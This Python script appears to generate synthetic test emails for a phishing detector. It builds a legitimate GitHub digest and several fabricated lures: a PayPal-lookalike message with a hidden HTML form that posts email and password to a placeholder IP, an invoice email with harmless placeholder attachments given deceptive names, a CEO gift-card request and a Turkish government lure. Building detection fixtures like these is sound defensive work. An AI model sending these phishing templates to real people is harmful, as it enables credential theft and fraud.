"""Generate the synthetic sample e-mails used by the demo and the test-suite.

All samples are fabricated for testing. Attachments contain only harmless
placeholder bytes (e.g. the two-byte "MZ" header followed by text) - nothing
is executable. IP addresses come from the documentation ranges (RFC 5737)
where possible.

    python samples/generate_samples.py
"""

from __future__ import annotations

import io
import zipfile
from email.message import EmailMessage
from pathlib import Path

OUT = Path(__file__).parent


def _base(subject: str, from_: str, to: str, date: str, msg_id: str | None = True) -> EmailMessage:
    m = EmailMessage()
    m["Subject"] = subject
    m["From"] = from_
    m["To"] = to
    m["Date"] = date
    if msg_id:
        m["Message-ID"] = msg_id
    return m


def legit_newsletter() -> EmailMessage:
    m = EmailMessage()
    m["Received"] = ("from mail-out.github.com (mail-out.github.com [192.30.252.201]) by mx.example.com "
                     "with ESMTPS id a1; Mon, 02 Nov 2026 09:00:03 +0000")
    m["Authentication-Results"] = ("mx.example.com; spf=pass smtp.mailfrom=github.com; "
                                   "dkim=pass header.d=github.com; dmarc=pass header.from=github.com")
    m["Return-Path"] = "<noreply@github.com>"
    m["Subject"] = "Your weekly repository digest"
    m["From"] = "GitHub <noreply@github.com>"
    m["To"] = "analyst@example.com"
    m["Date"] = "Mon, 02 Nov 2026 09:00:00 +0000"
    m["Message-ID"] = "<digest-123@github.com>"
    m.set_content("Hi analyst,\n\nHere is what happened in your repositories this week.\n"
                  "View the activity: https://github.com/notifications\n\nThanks,\nThe GitHub Team\n")
    m.add_alternative(
        '<p>Hi analyst,</p><p>Here is what happened in your repositories this week.</p>'
        '<p><a href="https://github.com/notifications">View activity</a></p>', subtype="html")
    return m


def credential_harvest() -> EmailMessage:
    m = EmailMessage()
    m["Received"] = ("from mx.example.com by mail.example.com with ESMTP id b7; Mon, 02 Nov 2026 07:14:10 +0000")
    m["Received"] = ("from vps-4471.badhost.example (unknown [203.0.113.45]) by mx.example.com "
                     "with ESMTP id b6; Mon, 02 Nov 2026 07:14:08 +0000")
    m["Authentication-Results"] = ("mx.example.com; spf=fail smtp.mailfrom=paypa1-security.com; "
                                   "dkim=none; dmarc=fail header.from=paypa1-security.com")
    m["Return-Path"] = "<bounce@mailer-x91.top>"
    m["Reply-To"] = "resolution-center@protonmail.com"
    m["Subject"] = "URGENT: Unusual sign-in activity - your account will be suspended"
    m["From"] = '"PayPal Security" <service@paypa1-security.com>'
    m["To"] = "victim@example.com"
    m["Date"] = "Mon, 02 Nov 2026 07:14:00 +0000"
    m["Message-ID"] = "<9f2c1@paypa1-security.com>"
    m.set_content("Dear Customer,\n\nWe detected unusual sign-in activity on your account. "
                  "Please verify your account within 24 hours or your account will be suspended.\n\n"
                  "https://paypa1-security.com/webscr/login?session=8812\n")
    m.add_alternative(
        '<p>Dear Customer,</p>'
        '<p>We detected <b>unusual sign-in activity</b>. Please verify your account within 24 hours '
        'or your account will be suspended.</p>'
        '<p><a href="http://paypa1-security.com/webscr/login?session=8812">https://www.paypal.com/signin</a></p>'
        '<form action="http://203.0.113.45/collect.php" method="post">'
        '<input name="email"><input type="password" name="pass"><button>Verify</button></form>'
        '<div style="display:none">newsletter unsubscribe weather sports</div>', subtype="html")
    return m


def malicious_attachment() -> EmailMessage:
    m = EmailMessage()
    m["Received"] = ("from [198.51.100.23] (helo=office-pc) by mx.example.com with ESMTP id c2; "
                     "Mon, 02 Nov 2026 11:02:41 +0000")
    m["Received-SPF"] = "softfail (domain of transitioning acme-logistics.example) client-ip=198.51.100.23"
    m["Subject"] = "Outstanding invoice #INV-20931 - payment failed"
    m["From"] = "Accounts Payable <billing@acme-logistics.example>"
    m["To"] = "finance@example.com"
    m["Date"] = "Mon, 02 Nov 2026 11:02:40 +0000"
    m["X-Mailer"] = "PHPMailer 5.2.1"
    m.set_content("Hello,\n\nYour payment failed. Please review the attached outstanding invoice and "
                  "remit by wire transfer today.\n\nRegards,\nAccounts Payable\n")
    # Harmless placeholder: "MZ" header + text. NOT an executable.
    m.add_attachment(b"MZ" + b"\x00" * 62 + b"PhishLens harmless test placeholder - not executable",
                     maintype="application", subtype="octet-stream", filename="Invoice_20931.pdf.exe")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("Invoice_20931.js", "// PhishLens harmless test placeholder\n")
    m.add_attachment(buf.getvalue(), maintype="application", subtype="zip", filename="Invoice_scan.zip")
    m.add_attachment(b"PhishLens test placeholder", maintype="application",
                     subtype="vnd.ms-excel.sheet.macroEnabled.12", filename="Remittance.xlsm")
    return m


def bec_ceo_fraud() -> EmailMessage:
    m = EmailMessage()
    m["Received"] = ("from mail-sor-f41.google.com (mail-sor-f41.google.com [209.85.220.41]) "
                     "by mx.example.com with ESMTPS id d9; Mon, 02 Nov 2026 13:31:02 +0000")
    m["Authentication-Results"] = ("mx.example.com; spf=pass smtp.mailfrom=gmail.com; "
                                   "dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com")
    m["Subject"] = "Quick request"
    m["From"] = '"CEO - ceo@example.com" <ceo.office.private@gmail.com>'
    m["To"] = "assistant@example.com"
    m["Date"] = "Mon, 02 Nov 2026 13:31:00 +0000"
    m["Message-ID"] = "<CAF=123@mail.gmail.com>"
    m.set_content("Hi,\n\nAre you available? I need a quick favor. I need you to purchase gift cards "
                  "for a client meeting today. Keep this confidential until I announce it.\n\n"
                  "Sent from my iPhone\n")
    return m


def tr_government_lure() -> EmailMessage:
    m = EmailMessage()
    m["Received"] = ("from smtp.bulkmail.example (unknown [192.0.2.77]) by mx.example.com.tr "
                     "with ESMTP id e4; Mon, 02 Nov 2026 15:45:12 +0300")
    m["Authentication-Results"] = "mx.example.com.tr; spf=softfail smtp.mailfrom=edevlet-bildirim.xyz; dmarc=fail"
    m["Subject"] = "Acil: Ödenmemiş fatura - hesabınız askıya alınacak"
    m["From"] = '"e-Devlet Kapısı" <bildirim@edevlet-bildirim.xyz>'
    m["To"] = "kullanici@example.com.tr"
    m["Date"] = "Mon, 02 Nov 2026 15:45:00 +0300"
    m.set_content("Sayın Kullanıcı,\n\nAdınıza ödenmemiş fatura bulunmaktadır. 24 saat içinde "
                  "kimliğinizi doğrulayın, aksi halde hesabınız askıya alınacaktır.\n\n"
                  "Doğrulama: https://bit.ly/3xYz-edevlet\n"
                  "Alternatif: http://xn--turkye-gov-0ub.com/giris\n")
    return m


SAMPLES = {
    "01_legit_newsletter.eml": legit_newsletter,
    "02_credential_harvest.eml": credential_harvest,
    "03_malicious_attachment.eml": malicious_attachment,
    "04_bec_ceo_fraud.eml": bec_ceo_fraud,
    "05_tr_edevlet_lure.eml": tr_government_lure,
}


def main() -> None:
    for name, factory in SAMPLES.items():
        (OUT / name).write_bytes(bytes(factory()))
        print(f"wrote {OUT / name}")


if __name__ == "__main__":
    main()
